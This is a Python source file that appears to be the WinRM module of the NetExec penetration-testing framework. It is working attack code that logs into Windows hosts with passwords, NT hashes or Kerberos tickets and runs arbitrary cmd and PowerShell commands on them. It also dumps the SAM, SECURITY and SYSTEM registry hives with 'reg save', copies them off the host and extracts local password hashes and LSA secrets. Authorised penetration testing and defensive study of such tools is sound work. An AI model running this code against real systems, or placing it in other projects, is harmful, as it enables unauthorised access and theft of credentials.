import os
import base64
import requests
import urllib3
import tempfile
import platform
import logging
import xml.etree.ElementTree as ET

from io import StringIO
from datetime import datetime
from binascii import unhexlify
from pypsrp.wsman import NAMESPACES
from pypsrp.client import Client

from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes

from nxc.helpers.powershell import get_ps_script
from nxc.config import process_secret
from nxc.connection import connection
from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.misc import gen_random_string
from nxc.helpers.ntlm_parser import parse_challenge
from nxc.logger import NXCAdapter


urllib3.disable_warnings()


class winrm(connection):
    def __init__(self, args, db, host):
        self.domain = ""
        self.targedDomain = ""
        self.server_os = None
        self.output_filename = None
        self.endpoint = None
        self.hash = None
        self.lmhash = ""
        self.nthash = ""
        self.ssl = False
        self.challenge_header = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        # For more details, please check the function "print_host_info"
        logging.getLogger("pypsrp").disabled = True
        logging.getLogger("pypsrp.wsman").disabled = True
        self.logger = NXCAdapter(
            extra={
                "protocol": "WINRM",
                "host": self.host,
                "port": "5985",
                "hostname": self.hostname,
            }
        )

    def enum_host_info(self):
        ntlm_info = parse_challenge(base64.b64decode(self.challenge_header.split(" ")[1].replace(",", "")))
        self.targetDomain = self.domain = ntlm_info["domain"]
        self.hostname = ntlm_info["hostname"]
        self.server_os = ntlm_info["os_version"]
        self.logger.extra["hostname"] = self.hostname

        self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)

        if self.args.domain:
            self.domain = self.args.domain
        if self.args.local_auth:
            self.domain = self.hostname

        self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))

    def print_host_info(self):
        self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
        self.logger.extra["port"] = self.port
        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain})")

    def create_conn_obj(self):
        if self.is_link_local_ipv6:
            self.logger.fail("winrm not support link-local ipv6, exiting...")
            return False

        endpoints = {}

        headers = {
            "Content-Length": "0",
            "Keep-Alive": "true",
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "User-Agent": "Microsoft WinRM Client",
            "Authorization": "Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
        }

        for protocol in self.args.check_proto:
            endpoints[protocol] = {}
            endpoints[protocol]["port"] = self.port[self.args.check_proto.index(protocol)] if len(self.port) == 2 else self.port[0]
            endpoints[protocol]["url"] = "{}://{}:{}/wsman".format(
                protocol,
                self.host if not self.is_ipv6 else f"[{self.host}]",
                endpoints[protocol]["port"]
            )
            endpoints[protocol]["ssl"] = (protocol != "http")

        for protocol in endpoints:
            self.port = endpoints[protocol]["port"]
            try:
                self.logger.debug(f"Requesting URL: {endpoints[protocol]['url']}")
                res = requests.post(endpoints[protocol]["url"], headers=headers, verify=False, timeout=self.args.http_timeout)
                self.logger.debug(f"Received response code: {res.status_code}")
                self.challenge_header = res.headers["WWW-Authenticate"]
                if (not self.challenge_header) or ("Negotiate" not in self.challenge_header):
                    self.logger.info('Failed to get NTLM challenge from target "/wsman" endpoint, maybe isn\'t winrm service.')
                    return False
                self.endpoint = endpoints[protocol]["url"]
                self.ssl = endpoints[protocol]["ssl"]
                return True
            except requests.exceptions.Timeout as e:
                self.logger.info(f"Connection Timed out to WinRM service: {e}")
            except requests.exceptions.ConnectionError as e:
                if "Max retries exceeded with url" in str(e):
                    self.logger.info("Connection Timeout to WinRM service (max retries exceeded)")
                else:
                    self.logger.info(f"Other ConnectionError to WinRM service: {e}")
        return False

    def check_if_admin(self):
        wsman = self.conn.wsman
        wsen = NAMESPACES["wsen"]
        wsmn = NAMESPACES["wsman"]

        enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
        ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
        ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"

        wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
        self.admin_privs = True
        return True

    # pypsrp not support nthash with kerberos auth, only support cleartext password with kerberos auth
    # So, we can get a TGT when doing nthash with kerberos auth
    def getTGT(self):
        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            clientName=userName,
            password=self.password,
            domain=self.domain,
            lmhash=unhexlify(self.lmhash),
            nthash=unhexlify(self.nthash),
            aesKey=self.aesKey,
            kdcHost=self.kdcHost
        )
        ccache = CCache()
        ccache.fromTGT(tgt, oldSessionKey, sessionKey)
        tgt_file = os.path.join(tempfile.gettempdir(), f"{self.username}@{self.domain}.ccache")
        ccache.saveFile(tgt_file)
        os.environ["KRB5CCNAME"] = tgt_file

    # pypsrp is relate MIT kerberos toolkit, not like impacket
    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        if platform.system() != "Linux":
            self.logger.fail("Doing kerberos auth with WINRM only support Linux platform!")
            return False
        self.admin_privs = False
        lmhash = ""
        nthash = ""
        self.password = password
        self.username = username
        self.domain = domain
        self.kdcHost = kdcHost
        
        # MIT krb5.conf prepare
        with open(get_ps_script("winrm_krb5_config/krb5.conf")) as krb5_conf:
            krb5_conf = krb5_conf.read()
        krb5_conf = krb5_conf.replace("REPLACE_ME_DOMAIN_UPPER", self.domain.upper())
        krb5_conf = krb5_conf.replace("REPLACE_ME_DOMAIN", self.domain)
        krb5_conf_name = os.path.join(tempfile.gettempdir(), f"{self.domain}.conf")
        with open(krb5_conf_name, "w") as krb5_conf_write:
            krb5_conf_write.write(krb5_conf)
        os.environ["KRB5_CONFIG"] = krb5_conf_name

        if not password:
            if ntlm_hash.find(":") != -1:
                lmhash, nthash = ntlm_hash.split(":")
            else:
                nthash = ntlm_hash
            self.nthash = nthash
            self.lmhash = lmhash
        
        kerb_pass = next(s for s in [nthash, password, aesKey] if s) if not all(s == "" for s in [nthash, password, aesKey]) else ""
        if useCache and not kerb_pass:
            ccache = CCache.loadFile(os.getenv("KRB5CCNAME"))
            username = ccache.credentials[0].header["client"].prettyPrint().decode().split("@")[0]
            self.username = username
        used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"

        for spn in ["HOST", "HTTP", "WSMAN"]:
            # MIT kerberos not support nthash auth
            try:
                if not useCache and kerb_pass:
                    self.getTGT()
                self.conn = Client(
                    self.host,
                    port=self.port,
                    auth="kerberos",
                    username=f"{self.username}@{self.domain.upper()}",
                    password="",
                    ssl=self.ssl,
                    cert_validation=False,
                    negotiate_service=spn,
                    negotiate_hostname_override=self.hostname,
                )
                self.check_if_admin()
                self.logger.success(f"{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}")

                if not self.args.local_auth:
                    add_user_bh(self.username, self.domain, self.logger, self.config)
                return True
            except Exception as e:
                if hasattr(e, "base_error"):
                    self.logger.debug(f"Request service ticket with SPN: '{spn}/{self.hostname}' failed")
                elif (hasattr(e, "err_code") and e.err_code == -1765328360) or (hasattr(e, "getErrorCode") and e.getErrorCode() == 24):
                    error_msg = "(Password error!)"
                    out = f"{self.domain}\\{self.username}{used_ccache} {error_msg}"
                    self.logger.fail(out)
                    return False
                elif (hasattr(e, "err_code") and e.err_code == -1765328378) or (hasattr(e, "getErrorCode") and e.getErrorCode() == 6):
                    error_msg = "(Username invalid! (not found in Kerberos database))"
                    out = f"{self.domain}\\{self.username}{used_ccache} {error_msg}"
                    self.logger.fail(out)
                    return False
                else:
                    out = f"{self.domain}\\{self.username}{used_ccache} {e!s}"
                    self.logger.fail(out)
                    return False

    def plaintext_login(self, domain, username, password):
        self.admin_privs = False
        self.password = password
        self.username = username
        self.domain = domain
        try:
            self.conn = Client(
                self.host,
                port=self.port,
                auth="ntlm",
                username=f"{self.domain}\\{self.username}",
                password=self.password,
                ssl=self.ssl,
                cert_validation=False,
            )

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)
            # TODO: when we can easily get the host_id via RETURNING statements, readd this in

            if self.admin_privs:
                self.logger.debug("Inside admin privs")
                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host)  # , user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {e!s}")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        self.admin_privs = False
        lmhash = "00000000000000000000000000000000"
        nthash = ""
        self.username = username
        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
        else:
            nthash = ntlm_hash

        self.lmhash = lmhash
        self.nthash = nthash
        self.domain = domain

        try:
            self.conn = Client(
                self.host,
                port=self.port,
                auth="ntlm",
                username=f"{self.domain}\\{self.username}",
                password=f"{self.lmhash}:{self.nthash}",
                ssl=self.ssl,
                cert_validation=False,
            )

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}")

            if self.admin_privs:
                self.db.add_admin_user("hash", domain, self.username, nthash, self.host)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {e!s}")
            return False

    def execute(self, payload=None, get_output=True, shell_type="cmd"):
        if not payload:
            payload = self.args.execute

        if self.args.no_output:
            get_output = False

        try:
            result = self.conn.execute_cmd(payload, encoding=self.args.codec) if shell_type == "cmd" else self.conn.execute_ps(payload)
        except Exception as e:
            # Reference: https://github.com/diyan/pywinrm/issues/275
            if hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Execute command failed, current user: '{self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})")

                if shell_type == "cmd":
                    self.logger.info("Cannot execute command via cmd, the user probably does not have invoke rights with Root WinRM listener - now switching to Powershell to attempt execution")
                    self.execute(payload, get_output, shell_type="powershell")
            elif ("decode" in str(e)) and not get_output:
                self.logger.success(f"Executed command (shell type: {shell_type})")
            else:
                self.logger.fail(f"Execute command failed, error: {e!s}")
        else:
            self.logger.success(f"Executed command (shell type: {shell_type})")
            buf = StringIO(result[0]).readlines() if get_output else ""
            for line in buf:
                self.logger.highlight(line.strip())

    def ps_execute(self):
        self.execute(payload=self.args.ps_execute, get_output=True, shell_type="powershell")

    # Dos attack prevent:
    # if someboby executed "reg save HKLM\sam C:\windows\temp\sam" before, but didn't remove "C:\windows\temp\sam" file,
    # when user execute the same command next time, in tty shell, the prompt will ask "File C:\windows\temp\sam already exists. Overwrite (Yes/No)?"
    # but in here, it isn't not a tty shell, pypsrp will do a crazy loop command execution when it didn't get any response (stuck in "Yes/No" prompt)
    # and it will make target host OOM error just like dos attack.
    # To prevent that, just make the store file name randomly.
    def sam(self):
        sam_storename = gen_random_string(6)
        system_storename = gen_random_string(6)
        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
        try:
            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", self.output_filename + ".sam")
            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", self.output_filename + ".system")
            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
        except Exception as e:
            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                self.logger.fail("Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user")
            elif hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'")
            else:
                self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
        else:
            local_operations = LocalOperations(f"{self.output_filename}.system")
            boot_key = local_operations.getBootKey()
            SAM = SAMHashes(
                f"{self.output_filename}.sam",
                boot_key,
                isRemote=None,
                perSecretCallback=lambda secret: self.logger.highlight(secret),
            )
            SAM.dump()
            SAM.export(f"{self.output_filename}.sam")

    def lsa(self):
        security_storename = gen_random_string(6)
        system_storename = gen_random_string(6)
        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
        try:
            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{self.output_filename}.security")
            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{self.output_filename}.system")
            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
        except Exception as e:
            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                self.logger.fail("Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user")
            elif hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'")
            else:
                self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
        else:
            local_operations = LocalOperations(f"{self.output_filename}.system")
            boot_key = local_operations.getBootKey()
            LSA = LSASecrets(
                f"{self.output_filename}.security",
                boot_key,
                None,
                isRemote=None,
                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
            )
            LSA.dumpCachedHashes()
            LSA.dumpSecrets()
